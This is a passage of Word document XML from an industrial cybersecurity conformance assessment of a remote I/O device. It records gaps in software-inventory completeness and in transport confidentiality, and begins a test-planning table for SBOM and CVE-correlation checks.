              <w:t>SRIO-2948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21247" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> stack — the single most safety-relevant installed software</w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — add </w:t>
            </w:r>
            <w:hyperlink r:id="rId140" w:history="1">
              <w:r w:rsidRPr="009B0AAA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9B0AAA">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="009B0AAA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</w:tbl>
    <w:p w14:paraId="0688AEE8" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>identification-scoped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AABEB1" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (SBOM completeness — decisive, in scope).</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The device exposes </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>top-level version strings only</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and provides </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no consolidated SBOM</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The installed software </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>necessary for safe operation</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> demonstrably includes un-enumerated third-party components: </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>µC/OS-II (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Micrium</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-1260), the </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">SIL3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-1929), the </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STM32F7 self-test library</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-10766), the </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>netX90 PROFINET stack</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-1768). Without an SBOM these cannot be inventoried or CVE-correlated → CR 7.8 partially met. Strongest, requirement-specific gap (OWASP ISVS V1.1.1; BSI TR-03183; 4-1 SM-9/SM-10). </w:t>
      </w:r>
      <w:hyperlink r:id="rId141" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId142" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId143" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[ICS-</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Securi</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>endium_pdf</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="65625FEB" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (confidentiality — in scope, your secondary gap).</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> All inventory served over </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>plaintext HTTP</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-7903), </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>HTTPS/WebSocket/MQTT unsupported</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-7907/7906/7905) → on-segment version reconnaissance. </w:t>
      </w:r>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">CR 4.1/4.3 not </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>met</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId144" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A06AF7D" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:del w:id="20" w:author="Unknown">
        <w:r w:rsidRPr="009B0AAA">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>G-3 (inventory integrity / MITM falsification)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Moved to RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (protection of identified software). </w:t>
      </w:r>
      <w:r w:rsidRPr="005B4077">
        <w:t>Cross-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>reference</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>only</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D86FE37" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion (identification-scoped):</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-006 is </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partially met.</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Top-level installed-software identification exists and is </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>readable</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (CR 7.8 accessibility satisfied); shortfalls are </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no SBOM-grade third-party inventory (G-1, decisive)</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no transport confidentiality (G-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>integrity/authenticity</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the inventory is </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>assessed under RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, not here. This mirrors RQ-004's verdict (a defensible consistency to foreground).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED35978" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:pict w14:anchorId="6B11C5DE">
          <v:rect id="_x0000_i1416" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1C5A77" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C7431A" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">RQ-006 overlaps RQ-004; I </w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>reuse and reference</w:t>
      </w:r>
      <w:r w:rsidRPr="009B0AAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> rather than duplicate. </w:t>
      </w:r>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">Only </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> SBOM-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>completeness</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005B4077">
        <w:t>genuinely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve"> RQ-006-specific.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3021"/>
        <w:gridCol w:w="3126"/>
        <w:gridCol w:w="1387"/>
        <w:gridCol w:w="533"/>
      </w:tblGrid>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="0F17E5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65F4F1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7299BF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80DFD9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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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1848CB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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077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AD8019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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="7444C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74062" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077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DC565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t>Enumerate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the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full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installed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">-software </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>surface</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>swinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>/*, I&amp;M0, I&amp;M5, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>fieldbussetup</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>fieldbusfirmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">); </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>build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the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installed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>-</w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">software </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>inventory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A8CB5" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Functional CR 7.8; confirms host/SCPU/bootloader/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>-stack identification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4CD81" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Requirements-based verification; OWASP FSTM Stage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C87DB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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="183466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A51AC" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077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BFBF2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SBOM-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>completeness</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>version→CVE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analysis</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>attempt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to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derive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third</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">-party </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>components</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> (µC/OS-II, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>PROFIsafe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stack</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">, STM STL, netX90); </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>show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no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> SBOM → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve"> CVE </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005B4077">
              <w:t>correlation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D18D4" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (decisive, requirement-specific)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E5369" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077">
              <w:t xml:space="preserve">OWASP FSTM "SBOM Generation" + ISVS V1.1.1; ifm </w:t>
            </w:r>
            <w:r w:rsidRPr="005B4077">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CM-008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2A72E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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005B4077" w:rsidRPr="005B4077" w14:paraId="0209E1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A9C8D" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="005B4077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4A185" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="009B0AAA" w:rsidRDefault="005B4077" w:rsidP="005B4077">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009B0AAA">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
